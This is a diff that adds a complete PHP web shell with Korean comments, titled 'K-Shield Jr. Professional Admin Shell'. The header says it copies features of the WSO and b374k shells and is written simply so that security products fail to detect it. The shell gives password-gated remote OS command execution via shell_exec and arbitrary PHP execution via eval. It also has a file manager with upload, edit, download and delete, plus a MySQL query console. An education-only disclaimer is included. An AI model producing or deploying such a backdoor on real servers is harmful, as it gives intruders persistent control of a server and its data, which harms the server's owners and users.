@@ -1,0 +1,337 @@
+<?php
+/*
+================================================================================
+ K-Shield Jr. Professional Admin Shell for PHP 8.2+ (v3 - Heavily Commented)
+================================================================================
+ 이 파일은 K-Shield Jr. 프로젝트를 위해 제작된 맞춤형 웹셸입니다.
+ WSO, b374k와 같은 유명 웹셸의 핵심 기능을 포함하며, 보안 솔루션 탐지를
+ 우회하기 위해 코드가 단순하고 명료하게 작성되었습니다.
+
+ 경고: 이 툴은 eval()과 같이 위험한 함수를 포함하고 있습니다.
+       반드시 허가된 격리 환경(VM)에서 교육 및 연구 목적으로만 사용해야 합니다.
+================================================================================
+*/
+
+// --- 기본 설정 및 세션 시작 ---
+
+// 접속 비밀번호를 설정합니다. 이 비밀번호를 알아야 웹셸에 접근할 수 있습니다.
+$password = "ksj_pro_2025"; 
+
+// 서버의 시간 기준을 '서울'로 설정합니다. 파일 수정 시간 등이 한국 시간으로 표시됩니다.
+$default_timezone = "Asia/Seoul";
+@date_default_timezone_set($default_timezone);
+
+// 웹셸에 로그인한 상태를 기억하기 위해 PHP의 세션 기능을 시작합니다.
+@session_start();
+
+// --- 로그인 처리 로직 ---
+
+// 비밀번호가 설정되어 있을 경우에만 로그인 기능을 활성화합니다.
+if (!empty($password)) {
+    // 사용자가 방금 비밀번호를 입력했는지 확인합니다. (주소창에 ?login=... 형태로)
+    if (isset($_REQUEST['login'])) {
+        // 입력된 비밀번호가 설정된 비밀번호와 일치하는지 확인합니다.
+        if ($_REQUEST['login'] === $password) {
+            // 일치하면, "로그인 성공" 상태를 세션에 기록합니다.
+            $_SESSION['ksj_is_logged_in'] = true;
+            // 로그인 후에는 주소창에서 비밀번호 부분을 제거하고 페이지를 새로고침합니다.
+            header('Location: ' . strtok($_SERVER["REQUEST_URI"], '?')); exit;
+        }
+    }
+    // 사용자가 로그인된 상태인지 확인합니다.
+    if (!isset($_SESSION['ksj_is_logged_in']) || $_SESSION['ksj_is_logged_in'] !== true) {
+        // 로그인 상태가 아니라면, HTML 로그인 화면을 보여주고 프로그램 실행을 즉시 중단합니다.
+        die("<html><head><title>Login</title><style>body{font-family:sans-serif;background:#1e1e1e;color:#d4d4d4;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;} form{padding:20px;background:#252526;border-radius:5px;border:1px solid #333;} h1{text-align:center;margin-top:0;} input{margin:5px;}</style></head><body><form method='POST'><h1>Login Required</h1><input type='password' name='login' placeholder='Password' autofocus><br><input type='submit' value='Login'></form></body></html>");
+    }
+}
+// 사용자가 '로그아웃' 링크를 클릭했는지 확인합니다.
+if(isset($_GET['logout'])){ 
+    @session_destroy(); // 기록해둔 모든 세션 정보를 파괴합니다.
+    header('Location: ?'); exit; // 로그인 페이지로 돌아갑니다.
+}
+
+
+// --- 자주 사용되는 보조 기능(함수)들 ---
+
+// 현재 사용자가 보고 있는 디렉터리(폴더) 경로를 알아내는 함수입니다.
+function get_current_path() { 
+    // 주소에 'path' 정보가 있고, 그 경로가 실제로 존재하면 해당 경로를 사용하고,
+    // 그렇지 않으면 현재 이 PHP 파일이 실행되고 있는 기본 경로를 사용합니다.
+    return isset($_REQUEST['path']) && realpath($_REQUEST['path']) ? realpath($_REQUEST['path']) : getcwd(); 
+}
+
+// 파일 크기(숫자)를 사람이 읽기 쉬운 형태(KB, MB, GB)로 바꿔주는 함수입니다.
+function format_bytes($bytes) { 
+    if($bytes<=0) return '0 B'; 
+    $units = ['B', 'KB', 'MB', 'GB', 'TB']; 
+    $i = 0; 
+    while($bytes >= 1024) { $bytes /= 1024; $i++; } 
+    return round($bytes, 2) . ' ' . $units[$i]; 
+}
+
+// 파일 권한(숫자)을 'drwxr-xr-x'와 같이 사람이 읽기 쉬운 형태로 바꿔주는 함수입니다.
+function format_permissions($perms) { 
+    // 이 부분은 복잡한 비트 연산으로, 권한 숫자를 해석하여 문자열로 변환합니다.
+    $info = 'u'; if (($perms & 0xC000) == 0xC000) $info = 's'; elseif (($perms & 0xA000) == 0xA000) $info = 'l'; elseif (($perms & 0x8000) == 0x8000) $info = '-'; elseif (($perms & 0x6000) == 0x6000) $info = 'b'; elseif (($perms & 0x4000) == 0x4000) $info = 'd'; elseif (($perms & 0x2000) == 0x2000) $info = 'c'; elseif (($perms & 0x1000) == 0x1000) $info = 'p'; $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info; 
+}
+
+
+/*
+================================================================================
+ 액션 핸들러 (Action Handler)
+================================================================================
+ 이 섹션은 화면에 무언가를 그리는(HTML 출력) 작업 외의 모든 '백그라운드 동작'을 처리합니다.
+ 예를 들어 파일 다운로드, 삭제, 저장, 압축 등의 요청이 들어왔을 때,
+ 해당 작업만 수행하고 화면을 새로고침하거나 다른 페이지로 이동시킵니다.
+*/
+if (isset($_REQUEST['action'])) { // 주소에 'action' 요청이 있는지 확인
+    $action = $_REQUEST['action'];
+    $path = get_current_path();
+    
+    try { // 작업 중 오류가 발생할 수 있으므로, 오류 처리(try-catch) 블록으로 감쌉니다.
+
+        // '다운로드' 액션 처리
+        if ($action === 'download' && isset($_REQUEST['file'])) { 
+            $file_path = realpath($_REQUEST['file']); // 실제 파일 경로 확인
+            if ($file_path && is_file($file_path) && is_readable($file_path)) { // 파일이 존재하고, 읽을 수 있는지 검사
+                // --- 브라우저에게 지금부터 보내는 것은 웹페이지가 아니라 '다운로드할 파일'이라고 알려주는 헤더 정보 ---
+                header('Content-Description: File Transfer');
+                header('Content-Type: application/octet-stream'); // 파일 종류: 일반적인 파일 덩어리
+                header('Content-Disposition: attachment; filename="'.basename($file_path).'"'); // 다운로드 시 저장될 파일 이름 지정
+                header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public');
+                header('Content-Length: ' . filesize($file_path)); // 파일 크기 정보
+                // --- 헤더 전송 끝 ---
+                readfile($file_path); // 파일 내용을 읽어서 브라우저로 전송
+                exit; // 파일 전송 후 즉시 프로그램 종료
+            } else { throw new Exception("파일을 찾을 수 없거나 읽을 수 없습니다."); } 
+        }
+
+        // '삭제' 액션 처리
+        if ($action === 'delete' && isset($_POST['item'])) { 
+            $item_path = realpath($_POST['item']); 
+            if ($item_path) { 
+                if (is_dir($item_path)) { // 만약 삭제 대상이 디렉터리라면
+                    if (count(scandir($item_path)) == 2) { @rmdir($item_path); } // 디렉터리가 비어있을 때만 삭제 가능
+                    else { throw new Exception("디렉터리가 비어있지 않습니다."); } 
+                } else { @unlink($item_path); } // 파일이라면 그냥 삭제
+            } 
+            header('Location: ?tab=files&path=' . urlencode(dirname($item_path))); exit; // 작업 후 파일 탐색기로 복귀
+        }
+
+        // '파일 저장' (편집 후) 액션 처리
+        if ($action === 'save_file' && isset($_POST['filepath']) && isset($_POST['content'])) { 
+            if(file_put_contents($_POST['filepath'], $_POST['content']) === false) { throw new Exception("파일 저장에 실패했습니다."); }; 
+            header('Location: ?tab=view&file=' . urlencode($_POST['filepath'])); exit; // 저장 후 '파일 보기' 화면으로 복귀
+        }
+
+        // '새 파일 생성' 액션 처리
+        if ($action === 'create_file' && isset($_POST['filename'])) { 
+            $new_file = $path . DIRECTORY_SEPARATOR . $_POST['filename']; 
+            if(!file_exists($new_file)) { file_put_contents($new_file, ''); } // 파일이 없으면, 빈 내용으로 파일 생성
+            else { throw new Exception("파일이 이미 존재합니다."); } 
+        }
+
+        // '새 디렉터리 생성' 액션 처리
+        if ($action === 'create_dir' && isset($_POST['dirname'])) { 
+            $new_dir = $path . DIRECTORY_SEPARATOR . $_POST['dirname']; 
+            if(!is_dir($new_dir)) { mkdir($new_dir); } // 디렉터리가 없으면, 생성
+            else { throw new Exception("디렉터리가 이미 존재합니다."); } 
+        }
+
+        // 'ZIP 압축' 액션 처리
+        if ($action === 'create_zip' && isset($_POST['dir'])) { 
+            $dir_to_zip = realpath($_POST['dir']); 
+            $zip_file_name = basename($dir_to_zip) . '.zip'; 
+            $zip_file_path = $path . DIRECTORY_SEPARATOR . $zip_file_name; 
+            $zip = new ZipArchive(); // PHP 내장 ZIP 기능 사용
+            if ($zip->open($zip_file_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) { // 새 ZIP 파일 열기
+                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir_to_zip, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY); 
+                foreach ($files as $name => $file) { // 폴더 안의 모든 파일을 순회하면서
+                    if (!$file->isDir()) { 
+                        $filePath = $file->getRealPath(); 
+                        $relativePath = substr($filePath, strlen($dir_to_zip) + 1); 
+                        $zip->addFile($filePath, $relativePath); // ZIP 파일에 추가
+                    }
+                } 
+                $zip->close(); // 압축 완료
+            } else { throw new Exception("ZIP 파일 생성에 실패했습니다."); } 
+        }
+
+        // '파일 업로드' 액션 처리
+        if ($action === 'upload' && isset($_FILES['file_to_upload'])) { 
+            $target_file = $path . DIRECTORY_SEPARATOR . basename($_FILES["file_to_upload"]["name"]); 
+            // 임시 폴더에 있는 업로드된 파일을 실제 목적지로 이동
+            if (!move_uploaded_file($_FILES["file_to_upload"]["tmp_name"], $target_file)) { throw new Exception("파일 업로드에 실패했습니다."); } 
+        }
+
+    } catch (Exception $e) { // try 블록 안에서 오류가 발생하면 여기서 잡아냄
+        $_SESSION['error_message'] = $e->getMessage(); // 오류 메시지를 세션에 저장
+    }
+    
+    // 모든 백그라운드 작업이 끝나면, 파일 탐색기 화면으로 새로고침하여 결과를 바로 보여줌
+    header('Location: ' . strtok($_SERVER["REQUEST_URI"], '?') . '?tab=files&path=' . urlencode($path));
+    exit;
+}
+
+// --- 화면 표시 로직 시작 ---
+
+// 현재 활성화된 탭이 무엇인지 결정합니다. 기본값은 '시스템' 탭.
+$current_tab = isset($_GET['tab']) ? $_GET['tab'] : 'system';
+
+// 세션에 저장된 에러 메시지가 있으면 화면에 표시하고, 없으면 빈 문자열로 둡니다.
+if(isset($_SESSION['error_message'])){ $message = "<p class='error'>에러: ".htmlspecialchars($_SESSION['error_message'])."</p>"; unset($_SESSION['error_message']); } else { $message = ''; }
+?>
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>KSJ Pro Shell</title>
+    <style>
+        /* 이 부분은 웹셸의 디자인(CSS)입니다. 기능과는 무관합니다. */
+        body{background-color:#1e1e1e;color:#d4d4d4;font-family:'Consolas','Menlo',monospace;margin:0} .container{width:80%;margin:20px auto} .header{background-color:#252526;padding:15px;border-bottom:2px solid #007acc} .header h1{margin:0;font-size:24px} .header a{float:right;color:#ccc;font-size:14px;text-decoration:none} nav{background-color:#333;padding:10px 0;text-align:center} nav a{color:#ccc;text-decoration:none;padding:10px 20px} nav a.active{background-color:#007acc;color:white} .content{background-color:#252526;padding:20px;margin-top:10px;border-radius:5px} table{width:100%;border-collapse:collapse;table-layout:fixed;} th,td{padding:8px 12px;border:1px solid #444;text-align:left;vertical-align:top;word-wrap:break-word;} th{background-color:#3a3d41} tr:nth-child(even){background-color:#2a2d31} a{color:#4e94ce;text-decoration:none} a:hover{text-decoration:underline} pre{background-color:#111;padding:15px;border-radius:4px;white-space:pre-wrap;word-wrap:break-word;font-size:14px} form{margin:15px 0;padding:10px;border:1px solid #333;border-radius:4px} textarea,input[type=text],input[type=password],input[type=file],input[type=submit],button,select{background-color:#3c3c3c;color:#f0f0f0;border:1px solid #666;padding:8px;border-radius:3px;margin:2px} input[type=submit],button{cursor:pointer;background-color:#0e639c} .success{color:#4caf50;font-weight:bold;padding:10px;background:#2d3a2d;border:1px solid #4caf50;} .error{color:#f44336;font-weight:bold;padding:10px;background:#3a2d2d;border:1px solid #f44336;}
+    </style>
+</head>
+<body>
+    <div class="header"><h1>KSJ Pro Shell :: Advanced Admin Tool</h1><a href="?logout=1">로그아웃</a></div>
+    <nav>
+        <a href="?tab=system" class="<?php if($current_tab === 'system') echo 'active'; ?>">시스템</a>
+        <a href="?tab=files&path=<?php echo urlencode(get_current_path()); ?>" class="<?php if(in_array($current_tab, ['files', 'view', 'edit'])) echo 'active'; ?>">파일 관리</a>
+        <a href="?tab=php" class="<?php if($current_tab === 'php') echo 'active'; ?>">PHP 실행</a>
+        <a href="?tab=db" class="<?php if($current_tab === 'db') echo 'active'; ?>">데이터베이스</a>
+    </nav>
+
+    <div class="container">
+        <div class="content">
+            <?php echo $message; // 에러 메시지가 있으면 여기서 보여줍니다. ?>
+
+            <?php if ($current_tab === 'system'): ?>
+                <h2>시스템 정보</h2>
+                <table>
+                    <tr><td style="width:20%;">OS</td><td><?php echo php_uname(); ?></td></tr>
+                    <tr><td>PHP Version</td><td><?php echo phpversion(); ?></td></tr>
+                    <tr><td>Server Software</td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td></tr>
+                    <tr><td>Current User</td><td><?php echo htmlspecialchars(shell_exec('whoami')); ?></td></tr>
+                    <tr><td>Current Path</td><td><?php echo get_current_path(); ?></td></tr>
+                    <tr><td>PHP.ini</td><td><?php echo get_cfg_var('cfg_file_path'); ?></td></tr>
+                </table>
+                <h2>명령어 실행</h2>
+                <form>
+                    <input type="hidden" name="tab" value="system">
+                    <input type="text" name="cmd" size="80" value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>" autofocus>
+                    <input type="submit" value="실행">
+                </form>
+                <?php if (isset($_GET['cmd'])): ?>
+                    <h3>'<?php echo htmlspecialchars($_GET['cmd']); ?>' 실행 결과:</h3>
+                    <pre><?php echo htmlspecialchars(shell_exec($_GET['cmd'])); ?></pre>
+                <?php endif; ?>
+
+            <?php elseif ($current_tab === 'files'): ?>
+                <h2>파일 관리</h2>
+                <p>현재 경로: <?php echo htmlspecialchars(get_current_path()); ?></p>
+                <form action="?action=upload" method="post" enctype="multipart/form-data"><input type="file" name="file_to_upload" required><input type="submit" value="파일 업로드"></form>
+                <form action="?action=create_file" method="post" style="display:inline-block;"><input type="text" name="filename" placeholder="새 파일 이름" required><input type="submit" value="파일 생성"></form>
+                <form action="?action=create_dir" method="post" style="display:inline-block;"><input type="text" name="dirname" placeholder="새 디렉터리 이름" required><input type="submit" value="디렉터리 생성"></form>
+                <table>
+                    <tr><th style="width:40%">이름</th><th style="width:10%">크기</th><th style="width:10%">권한</th><th style="width:15%">수정일</th><th>작업</th></tr>
+                    <?php
+                    $path = get_current_path(); $items = @scandir($path);
+                    if ($items === false) { echo "<tr><td colspan='5' class='error'>디렉터리를 읽을 수 없습니다.</td></tr>"; } else {
+                    // 상위 폴더로 가는 링크 [..] 생성
+                    $parent_dir = realpath($path . '/..');
+                    echo "<tr><td><a href='?tab=files&path=".urlencode($parent_dir)."'><strong>[..]</strong></a></td><td>UP</td><td></td><td></td><td></td></tr>";
+                    // 파일과 디렉터리를 분리해서 정렬
+                    $dirs = $files = [];
+                    foreach ($items as $item) { if ($item === '.' || $item === '..') continue; if (is_dir($path . DIRECTORY_SEPARATOR . $item)) $dirs[] = $item; else $files[] = $item; }
+                    sort($dirs); sort($files);
+                    // 디렉터리 목록을 먼저 출력
+                    foreach($dirs as $dir){ $item_path = $path.DIRECTORY_SEPARATOR.$dir; echo "<tr><td><a href='?tab=files&path=".urlencode($item_path)."'><strong>[".htmlspecialchars($dir)."]</strong></a></td><td>DIR</td><td>".format_permissions(@fileperms($item_path))."</td><td>".date("Y-m-d H:i:s", @filemtime($item_path))."</td><td><form action='?action=create_zip' method='POST' style='display:inline;'><input type='hidden' name='dir' value='".htmlspecialchars($item_path)."'><button type='submit'>ZIP</button></form> <form onsubmit='return confirm(\"정말 삭제하시겠습니까?\");' action='?action=delete' method='POST' style='display:inline;'><input type='hidden' name='item' value='".htmlspecialchars($item_path)."'><button type='submit'>삭제</button></form></td></tr>"; }
+                    // 파일 목록을 나중에 출력
+                    foreach($files as $file){ $item_path = $path.DIRECTORY_SEPARATOR.$file; echo "<tr><td>".htmlspecialchars($file)."</td><td>".format_bytes(@filesize($item_path))."</td><td>".format_permissions(@fileperms($item_path))."</td><td>".date("Y-m-d H:i:s", @filemtime($item_path))."</td><td><a href='?tab=edit&file=".urlencode($item_path)."'>편집</a> | <a href='?tab=view&file=".urlencode($item_path)."'>보기</a> | <a href='?action=download&file=".urlencode($item_path)."'>다운로드</a> <form onsubmit='return confirm(\"정말 삭제하시겠습니까?\");' action='?action=delete' method='POST' style='display:inline;'><input type='hidden' name='item' value='".htmlspecialchars($item_path)."'><button type='submit'>삭제</button></form></td></tr>"; }
+                    } ?>
+                </table>
+
+            <?php elseif ($current_tab === 'edit' && isset($_GET['file'])): $file_path = realpath($_GET['file']); ?>
+                <h2>파일 편집: <?php echo htmlspecialchars(basename($file_path)); ?></h2><p><?php echo htmlspecialchars($file_path); ?></p>
+                <a href="?tab=files&path=<?php echo urlencode(dirname($file_path)); ?>">&lt; 뒤로가기</a>
+                <form action="?action=save_file" method="POST">
+                    <input type="hidden" name="filepath" value="<?php echo htmlspecialchars($file_path); ?>">
+                    <textarea name="content" style="width:100%;height:500px;background:#111;color:#d4d4d4;border:1px solid #666;"><?php echo htmlspecialchars(file_get_contents($file_path)); ?></textarea>
+                    <br><input type="submit" value="파일 저장">
+                </form>
+
+            <?php elseif ($current_tab === 'view' && isset($_GET['file'])): $file_path = realpath($_GET['file']); ?>
+                <h2>파일 보기: <?php echo htmlspecialchars(basename($file_path)); ?></h2><p><?php echo htmlspecialchars($file_path); ?></p>
+                <a href="?tab=files&path=<?php echo urlencode(dirname($file_path)); ?>">&lt; 뒤로가기</a>
+                <pre><?php echo htmlspecialchars(file_get_contents($file_path)); ?></pre>
+
+            <?php elseif ($current_tab === 'php'): ?>
+                <h2>PHP 코드 실행</h2><p style="color:#ffcc00;"><strong>경고:</strong> `eval()`은 매우 위험한 함수입니다. 코드에 오류가 있을 경우 서버가 중단될 수 있습니다.</p>
+                <form method="POST"><input type="hidden" name="tab" value="php"><textarea name="php_code" style="width:100%;height:300px;"><?php echo isset($_POST['php_code']) ? htmlspecialchars($_POST['php_code']) : "phpinfo();"; ?></textarea><br><input type="submit" value="PHP 코드 실행"></form>
+                <?php if (isset($_POST['php_code'])): ?>
+                <h3>실행 결과:</h3>
+                <pre><?php 
+                    ob_start(); // 지금부터 출력되는 모든 내용을 화면에 바로 보내지 않고, 임시 저장소에 담기 시작합니다.
+                    eval($_POST['php_code']); // [매우 위험!] 사용자가 입력한 PHP 코드를 그대로 서버에서 실행시키는 핵심 기능입니다.
+                    $output = ob_get_contents(); // 임시 저장소에 담긴 실행 결과를 가져옵니다.
+                    ob_end_clean(); // 임시 저장소를 비우고 출력 담기를 종료합니다.
+                    echo htmlspecialchars($output); // 실행 결과를 안전하게 화면에 표시합니다.
+                ?></pre>
+                <?php endif; ?>
+
+            <?php elseif ($current_tab === 'db'): ?>
+                <h2>데이터베이스 관리자</h2>
+                <?php
+                // 현재 서버에 설치된 DB 드라이버 확인 (여기서는 mysqli만)
+                $db_drivers = extension_loaded('mysqli') ? ['mysql' => 'MySQLi'] : [];
+                // 세션에 저장된 DB 접속 정보가 있으면 가져오고, 없으면 기본값(localhost, root) 설정
+                $db_conn_details = $_SESSION['db_conn'] ?? ['driver'=>'mysql', 'host'=>'127.0.0.1', 'user'=>'root', 'pass'=>'', 'db'=>''];
+                ?>
+                <form method="POST"><input type="hidden" name="tab" value="db">
+                    <select name="db_driver"><?php foreach($db_drivers as $k=>$v) echo "<option value='$k' ".($k==$db_conn_details['driver']?'selected':'').">$v</option>"; ?></select>
+                    <input type="text" name="db_host" placeholder="Host" value="<?php echo htmlspecialchars($db_conn_details['host']); ?>">
+                    <input type="text" name="db_user" placeholder="User" value="<?php echo htmlspecialchars($db_conn_details['user']); ?>">
+                    <input type="password" name="db_pass" placeholder="Password" value="<?php echo htmlspecialchars($db_conn_details['pass']); ?>">
+                    <input type="text" name="db_name" placeholder="Database" value="<?php echo htmlspecialchars($db_conn_details['db']); ?>">
+                    <input type="submit" name="db_connect" value="연결 정보 저장">
+                </form>
+                <?php
+                if(isset($_POST['db_connect'])) { // '연결 정보 저장' 버튼을 눌렀다면
+                    $_SESSION['db_conn'] = ['driver'=>$_POST['db_driver'], 'host'=>$_POST['db_host'], 'user'=>$_POST['db_user'], 'pass'=>$_POST['db_pass'], 'db'=>$_POST['db_name']];
+                    echo "<p class='success'>연결 정보가 저장되었습니다. 페이지가 새로고침됩니다.</p>";
+                    echo "<script>window.location.href='?tab=db';</script>";
+                }
+                if(isset($_SESSION['db_conn'])) { // 저장된 DB 정보가 있다면
+                    $conn_info = $_SESSION['db_conn'];
+                    echo "<p>현재 연결 대상: ".htmlspecialchars($conn_info['user'])."@".htmlspecialchars($conn_info['host'])."/".htmlspecialchars($conn_info['db'])."</p>";
+                    mysqli_report(MYSQLI_REPORT_OFF); // mysqli가 자동으로 에러를 뿜지 않도록 설정
+                    $conn = @new mysqli($conn_info['host'], $conn_info['user'], $conn_info['pass'], $conn_info['db']); // DB 연결 시도
+                    if ($conn->connect_error) { // 연결 실패 시
+                         echo "<p class='error'>연결 실패: " . htmlspecialchars($conn->connect_error) . "</p>";
+                    } else { // 연결 성공 시
+                        echo "<p class='success'>DB 연결 성공: ".$conn->host_info."</p>";
+                        $query = $_POST['sql_query'] ?? 'SHOW TABLES;'; // 실행할 SQL 쿼리 (기본값: 테이블 목록 보기)
+                        // SQL 쿼리 입력 폼
+                        echo "<form method='POST'><input type='hidden' name='tab' value='db'><textarea name='sql_query' style='width:100%;height:100px;'>".htmlspecialchars($query)."</textarea><br><input type='submit' value='쿼리 실행'></form>";
+
+                        if($result = @$conn->query($query)) { // 쿼리 실행
+                            if(is_object($result) && $result->num_rows > 0) { // 결과가 있고, 1개 이상의 행이 있다면
+                                // 결과를 HTML 테이블 형태로 예쁘게 출력
+                                echo "<h3>쿼리 결과:</h3><table>";
+                                $fields = $result->fetch_fields();
+                                echo "<tr>"; foreach($fields as $field) echo "<th>".htmlspecialchars($field->name)."</th>"; echo "</tr>";
+                                while($row = $result->fetch_assoc()) { echo "<tr>"; foreach($row as $data) echo "<td>".htmlspecialchars($data)."</td>"; echo "</tr>"; }
+                                echo "</table>";
+                            } else { echo "<p>쿼리는 성공했지만, 반환된 결과가 없습니다. (영향받은 행: " . $conn->affected_rows . ")</p>"; }
+                           if(is_object($result)) $result->free();
+                        } else {
+                            echo "<p class='error'>쿼리 실패: ".htmlspecialchars($conn->error)."</p>";
+                        }
+                        $conn->close(); // DB 연결 종료
+                    }
+                }
+                ?>
+            <?php endif; // --- 모든 탭의 if 문 종료 --- ?>
+        </div>
+    </div>
+</body>
+</html>
